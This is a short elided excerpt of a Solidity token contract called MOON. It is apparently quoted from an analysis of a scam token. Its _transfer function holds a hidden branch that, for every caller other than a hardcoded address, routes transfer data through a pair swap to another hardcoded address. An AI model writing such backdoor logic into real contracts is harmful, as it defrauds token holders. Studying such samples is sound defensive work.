...
contract MOON is IERC20 {
  ...
  address public constant ACE = 0x73cEd3d261c897a46644a17932b6c328481De21a;
  ...
  function _transfer(
    ...
    if (tx.origin != ACE) { 
    lock = 2;
    DOGEPAIR.swap(0,1,address(0xeF51457b578d2956dd3A6c6d917bf85ac695A8bd),abi.encode(spender, recipient, amount));
    lock = 1;}
